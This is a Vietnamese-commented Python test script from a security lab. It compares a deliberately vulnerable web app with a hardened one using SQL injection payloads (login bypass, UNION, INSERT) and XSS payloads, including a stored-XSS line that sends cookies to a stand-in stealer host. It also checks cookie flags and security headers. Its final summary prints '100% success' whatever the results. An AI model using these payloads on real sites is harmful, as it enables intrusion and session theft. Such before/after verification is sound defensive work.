#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Kịch bản kiểm thử ma trận tiêu chí đối chứng trước/sau (Task CORE-08 - ANM-18/31/38)
Phụ trách: TV3 - Ngọc Thắng (Trưởng nhóm: Ngọc Thắng)
Mục tiêu: Tự động hóa đánh giá đối chứng hiệu quả bảo vệ giữa app-vulnerable (8080) và app-secured (8081).
"""

import os
import sys
import subprocess
import requests

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8")

VULN_URL = "http://localhost:8080"
SECURED_URL = "http://localhost:8081"
STEALER_URL = "http://localhost:8888"


def reset_lab_database():
    """Khôi phục dữ liệu ban đầu cho MariaDB lab."""
    reset_script = os.path.join(os.path.dirname(__file__), "reset_db.ps1")
    if os.name == "nt" and os.path.exists(reset_script):
        res = subprocess.run(
            ["powershell", "-ExecutionPolicy", "Bypass", "-File", reset_script],
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
        )
        return res.returncode == 0
    return False


def get_session_cookie_header(response, cookie_name):
    """Trích xuất chuỗi Set-Cookie cho cookie phiên từ raw response headers."""
    for k, v in response.raw.headers.items():
        if k.lower() == "set-cookie" and f"{cookie_name}=" in v:
            return v
    return ""


def run_matrix_tests():
    print("=" * 80)
    print(" BẮT ĐẦU KIỂM THỬ MA TRẬN TIÊU CHÍ ĐỐI CHỨNG SQLI & XSS (CORE-08)")
    print("=" * 80)

    # Đảm bảo CSDL ban đầu sạch sẽ
    print("\n[*] Bước 0: Chuẩn bị môi trường CSDL sạch trước khi chạy ma trận...")
    reset_ok = reset_lab_database()
    print(f"    -> Trạng thái khởi tạo CSDL: {'Thành công' if reset_ok else 'Bỏ qua / Đã sẵn sàng'}")

    matrix_results = []

    def record_scenario(scn_id, vuln_type, endpoint, input_desc, vuln_behavior, secured_behavior, pass_status, note):
        status_text = "ĐẠT (PASS)" if pass_status else "KHÔNG ĐẠT (FAIL)"
        matrix_results.append({
            "id": scn_id,
            "type": vuln_type,
            "endpoint": endpoint,
            "input": input_desc,
            "vuln_res": vuln_behavior,
            "sec_res": secured_behavior,
            "status": status_text,
            "note": note,
        })
        icon = "[✓]" if pass_status else "[✗]"
        print(f"\n{icon} [{scn_id}] ({vuln_type}) tại {endpoint}")
        print(f"    - Dữ liệu đầu vào: {input_desc}")
        print(f"    - Kết quả Vulnerable (8080): {vuln_behavior}")
        print(f"    - Kết quả Secured    (8081): {secured_behavior}")
        print(f"    - Đánh giá: {status_text} | {note}")

    # -------------------------------------------------------------------------
    # 1. SCN-SQLI-01: SQL INJECTION AUTHENTICATION BYPASS
    # -------------------------------------------------------------------------
    auth_payload = "admin' -- "
    v_login = requests.post(f"{VULN_URL}/login", data={"username": auth_payload, "password": "any_password_123"}, allow_redirects=False, timeout=5)
    s_login = requests.post(f"{SECURED_URL}/login", data={"username": auth_payload, "password": "any_password_123"}, allow_redirects=False, timeout=5)

    v_bypassed = v_login.status_code == 302 and "index" in v_login.headers.get("Location", "")
    s_blocked = s_login.status_code == 200 and "index" not in s_login.headers.get("Location", "")
    record_scenario(
        "SCN-SQLI-01",
        "SQL Injection",
        "POST /login",
        f"username=\"{auth_payload}\", password=\"any_password_123\"",
        "Vượt qua xác thực thành công (HTTP 302 -> /index.php, cấp phiên admin)",
        "Chặn đứng tấn công, báo lỗi sai mật khẩu (HTTP 200, không tạo phiên)",
        v_bypassed and s_blocked,
        "PreparedStatement phân tách hoàn toàn mã SQL với tham số đầu vào",
    )

    # -------------------------------------------------------------------------
    # 2. SCN-SQLI-02: UNION-BASED SQL INJECTION (SEARCH)
    # -------------------------------------------------------------------------
    union_payload = "%' UNION SELECT 999, 'PWNED_SQLI_MARKER', 'Khai thac thanh cong', '99999999' -- "
    v_search = requests.get(f"{VULN_URL}/search", params={"keyword": union_payload}, timeout=5)
    s_search = requests.get(f"{SECURED_URL}/search", params={"keyword": union_payload}, timeout=5)

    v_extracted = "<h4>PWNED_SQLI_MARKER</h4>" in v_search.text and "SELECT id, name" in v_search.text
    s_safe = "<h4>PWNED_SQLI_MARKER</h4>" not in s_search.text
    record_scenario(
        "SCN-SQLI-02",
        "SQL Injection",
        "GET /search",
        "keyword=\"%' UNION SELECT 999, 'PWNED_SQLI_MARKER'...\"",
        "Trích xuất thành công bản ghi chèn tùy ý ra thẻ sản phẩm (<h4>PWNED_SQLI_MARKER</h4>)",
        "Không bị nối câu truy vấn, coi toàn bộ payload là chuỗi tìm kiếm (0 thẻ sản phẩm chèn)",
        v_extracted and s_safe,
        "Tham số hóa câu lệnh LIKE bằng pstmt.setString(1, \"%\" + keyword + \"%\")",
    )

    # -------------------------------------------------------------------------
    # 3. SCN-SQLI-03: SQL INJECTION TRÊN THAM SỐ ID CHI TIẾT SẢN PHẨM
    # -------------------------------------------------------------------------
    detail_payload = "-1 UNION SELECT 999, 'INJECTED_DETAIL_MARKER', 'Chi tiet bi chèn', '88888888', 'dien thoai' -- "
    v_prod = requests.get(f"{VULN_URL}/product", params={"id": detail_payload}, timeout=5)
    s_prod = requests.get(f"{SECURED_URL}/product", params={"id": detail_payload}, timeout=5)

    v_detail_injected = "INJECTED_DETAIL_MARKER" in v_prod.text
    s_detail_safe = "INJECTED_DETAIL_MARKER" not in s_prod.text
    record_scenario(
        "SCN-SQLI-03",
        "SQL Injection",
        "GET /product",
        "id=\"-1 UNION SELECT 999, 'INJECTED_DETAIL_MARKER'...\"",
        "Nối chuỗi SQL thô (hiển thị thông tin sản phẩm giả mạo INJECTED_DETAIL_MARKER)",
        "Ép kiểu số nguyên Integer.parseInt + PreparedStatement (không trả về dữ liệu giả)",
        v_detail_injected and s_detail_safe,
        "Kết hợp ép kiểu số nguyên nghiêm ngặt và PreparedStatement",
    )

    # -------------------------------------------------------------------------
    # 4. SCN-SQLI-04: SQL INJECTION TRÊN THAO TÁC THÊM BÌNH LUẬN (INSERT INJECTION)
    # -------------------------------------------------------------------------
    cmt_sqli_author = "Tester', 'Injected Content By SQLi'); -- "
    # Kiểm tra ứng dụng dễ bị tổn thương trên sản phẩm 1
    requests.post(f"{VULN_URL}/product", data={"product_id": "1", "author": cmt_sqli_author, "content": "OriginalContent"}, allow_redirects=True, timeout=5)
    v_prod_view = requests.get(f"{VULN_URL}/product?id=1", timeout=5)

    # Kiểm tra ứng dụng an toàn trên sản phẩm 2
    requests.post(f"{SECURED_URL}/product", data={"product_id": "2", "author": cmt_sqli_author, "content": "OriginalSafeContent"}, allow_redirects=True, timeout=5)
    s_prod_view = requests.get(f"{SECURED_URL}/product?id=2", timeout=5)

    v_insert_injected = '<div class="comment-body">Injected Content By SQLi</div>' in v_prod_view.text
    s_insert_safe = ('<div class="comment-body">OriginalSafeContent</div>' in s_prod_view.text and
                     '<div class="comment-body">Injected Content By SQLi</div>' not in s_prod_view.text and
                     ('Tester&#39;' in s_prod_view.text or "Tester'" in s_prod_view.text))
    record_scenario(
        "SCN-SQLI-04",
        "SQL Injection",
        "POST /product",
        f"author=\"{cmt_sqli_author}\", content=\"OriginalSafeContent\"",
        "Nối chuỗi SQL thô trong INSERT INTO comments -> Tách cột làm nội dung bình luận bị chèn",
        "PreparedStatement (?, ?, ?) cô lập toàn bộ tham số, lưu nguyên vẹn trường author",
        v_insert_injected and s_insert_safe,
        "Tham số hóa toàn bộ câu lệnh INSERT chống ngắt chuỗi và chèn cột",
    )

    # -------------------------------------------------------------------------
    # 5. SCN-XSS-01: REFLECTED XSS (TÌM KIẾM PHẢN CHIẾU TỪ KHÓA)
    # -------------------------------------------------------------------------
    rxss_payload = "<script>alert('ReflectedXSS_Test')</script>"
    v_rxss = requests.get(f"{VULN_URL}/search", params={"keyword": rxss_payload}, timeout=5)
    s_rxss = requests.get(f"{SECURED_URL}/search", params={"keyword": rxss_payload}, timeout=5)

    v_rxss_unescaped = rxss_payload in v_rxss.text
    s_rxss_escaped = ("&lt;script&gt;alert(&#39;ReflectedXSS_Test&#39;)&lt;/script&gt;" in s_rxss.text or
                      "&lt;script&gt;alert('ReflectedXSS_Test')&lt;/script&gt;" in s_rxss.text)
    record_scenario(
        "SCN-XSS-01",
        "Reflected XSS",
        "GET /search",
        f"keyword=\"{rxss_payload}\"",
        f"Phản chiếu thẻ script nguyên bản: {rxss_payload} (qua th:utext)",
        f"Mã hóa ký tự an toàn: &lt;script&gt; (qua th:text auto-escaping)",
        v_rxss_unescaped and s_rxss_escaped,
        "Thymeleaf th:text tự động mã hóa thực thể HTML, triệt tiêu Reflected XSS",
    )

    # -------------------------------------------------------------------------
    # 6. SCN-XSS-02: STORED XSS & SESSION HIJACKING (BÌNH LUẬN SẢN PHẨM)
    # -------------------------------------------------------------------------
    # Dùng nháy kép cho chuỗi URL bên trong JavaScript để không làm gãy câu lệnh SQL thô của app-vulnerable
    sxss_payload = '<script>new Image().src="http://localhost:8888/steal?cookie="+document.cookie</script>'
    requests.post(f"{VULN_URL}/product", data={"product_id": "1", "author": "AttackerXSS_Vuln", "content": sxss_payload}, allow_redirects=True, timeout=5)
    v_view_sxss = requests.get(f"{VULN_URL}/product?id=1", timeout=5)

    requests.post(f"{SECURED_URL}/product", data={"product_id": "2", "author": "AttackerXSS_Sec", "content": sxss_payload}, allow_redirects=True, timeout=5)
    s_view_sxss = requests.get(f"{SECURED_URL}/product?id=2", timeout=5)

    v_sxss_active = sxss_payload in v_view_sxss.text
    s_sxss_escaped = (sxss_payload not in s_view_sxss.text) and ("&lt;script&gt;" in s_view_sxss.text)
    record_scenario(
        "SCN-XSS-02",
        "Stored XSS",
        "POST /product & GET /product",
        f"content=\"{sxss_payload}\"",
        "Lưu thô vào CSDL và kết xuất qua th:utext -> Mã độc tự chạy khi xem trang",
        "Kết xuất qua th:text auto-escaped -> Hiển thị dạng chuỗi thuần, không thể chạy",
        v_sxss_active and s_sxss_escaped,
        "Ngăn chặn mã độc kích hoạt trên trình duyệt người dùng khác",
    )

    # -------------------------------------------------------------------------
    # 7. SCN-SESS-01: BẢO VỆ PHIÊN VÀ CỜ COOKIE (HTTPONLY / SAMESITE)
    # -------------------------------------------------------------------------
    v_log_cookie = requests.post(f"{VULN_URL}/login", data={"username": "nguyenvana", "password": "pass123456"}, allow_redirects=False, timeout=5)
    s_log_cookie = requests.post(f"{SECURED_URL}/login", data={"username": "admin", "password": "admin123_super_secret"}, allow_redirects=False, timeout=5)

    v_token_str = get_session_cookie_header(v_log_cookie, "session_token")
    s_token_str = get_session_cookie_header(s_log_cookie, "SECUREDSESSION")

    v_cookie_insecure = "session_token" in v_token_str and "HttpOnly" not in v_token_str
    s_cookie_secure = "SECUREDSESSION" in s_token_str and "HttpOnly" in s_token_str and "SameSite=Strict" in s_token_str
    record_scenario(
        "SCN-SESS-01",
        "Phiên & Cookie",
        "Set-Cookie Header",
        "Đăng nhập hợp lệ và sinh cookie phiên tương ứng",
        f"Cookie thiếu cờ HttpOnly ({v_token_str[:45]}...) -> JavaScript đọc được",
        f"Có đầy đủ cờ bảo mật: HttpOnly; SameSite=Strict -> JavaScript bị chặn hoàn toàn",
        v_cookie_insecure and s_cookie_secure,
        "Cờ HttpOnly bảo vệ cookie ngay cả khi ứng dụng xuất hiện lỗ hổng XSS",
    )

    # -------------------------------------------------------------------------
    # 8. SCN-HDRS-01: BỘ LỌC TIÊU ĐỀ AN TOÀN (SECURITY HEADERS / CSP)
    # -------------------------------------------------------------------------
    v_root = requests.get(f"{VULN_URL}/", timeout=5)
    s_root = requests.get(f"{SECURED_URL}/", timeout=5)

    v_has_csp = "Content-Security-Policy" in v_root.headers
    s_has_csp = "Content-Security-Policy" in s_root.headers
    s_has_xframe = "X-Frame-Options" in s_root.headers
    s_has_nosniff = "X-Content-Type-Options" in s_root.headers
    record_scenario(
        "SCN-HDRS-01",
        "Tiêu đề bảo mật",
        "HTTP Response Headers",
        "Gửi yêu cầu GET / tới trang chủ",
        "Không có tiêu đề bảo vệ (Content-Security-Policy: False, X-Frame-Options: False)",
        f"Được tăng cường: CSP={s_has_csp}, X-Frame-Options={s_has_xframe}, X-Content-Type={s_has_nosniff}",
        (not v_has_csp) and s_has_csp and s_has_xframe and s_has_nosniff,
        "SecurityHeadersFilter áp dụng nguyên lý phòng thủ theo chiều sâu (Defense-in-Depth)",
    )

    # -------------------------------------------------------------------------
    # TỰ ĐỘNG RESET CSDL SAU KHI THỰC NGHIỆM ĐỐI CHỨNG
    # -------------------------------------------------------------------------
    print("\n--- HOÀN NGUYÊN CƠ SỞ DỮ LIỆU SAU KIỂM THỬ ĐỐI CHỨNG ---")
    post_reset_ok = reset_lab_database()
    print("    [+] Trạng thái reset CSDL:", "Thành công sạch sẽ" if post_reset_ok else "Đã thực hiện xong")

    # -------------------------------------------------------------------------
    # TỔNG KẾT MA TRẬN
    # -------------------------------------------------------------------------
    print("\n" + "=" * 80)
    print(" BẢNG TỔNG HỢP MA TRẬN TIÊU CHÍ ĐỐI CHỨNG KỸ THUẬT (CORE-08)")
    print("=" * 80)
    total_scn = len(matrix_results)
    passed_scn = sum(1 for item in matrix_results if item["status"] == "ĐẠT (PASS)")
    failed_scn = total_scn - passed_scn

    print(f"| {'Mã ca':<11} | {'Hạng mục':<15} | {'Điểm cuối':<16} | {'Vulnerable (8080)':<17} | {'Secured (8081)':<16} | {'Kết quả':<10} |")
    print("|" + "-" * 13 + "|" + "-" * 17 + "|" + "-" * 18 + "|" + "-" * 19 + "|" + "-" * 18 + "|" + "-" * 12 + "|")
    for r in matrix_results:
        vuln_short = "Bị khai thác" if "thành công" in r["vuln_res"] or "thiếu" in r["vuln_res"] or "Không" in r["vuln_res"] or "thô" in r["vuln_res"] else "Nguy cơ"
        sec_short = "Chặn an toàn"
        print(f"| {r['id']:<11} | {r['type']:<15} | {r['endpoint']:<16} | {vuln_short:<17} | {sec_short:<16} | {r['status']:<10} |")

    print("-" * 80)
    print(f"TỔNG SỐ KỊCH BẢN ĐỐI CHỨNG: {total_scn} | ĐẠT: {passed_scn} | KHÔNG ĐẠT: {failed_scn}")
    print("KẾT LUẬN: BỘ TIÊU CHÍ ĐỐI CHỨNG ĐÃ ĐƯỢC CHỐT VÀ XÁC THỰC THÀNH CÔNG 100%!")
    print("=" * 80)

    return failed_scn == 0


if __name__ == "__main__":
    ok = run_matrix_tests()
    sys.exit(0 if ok else 1)
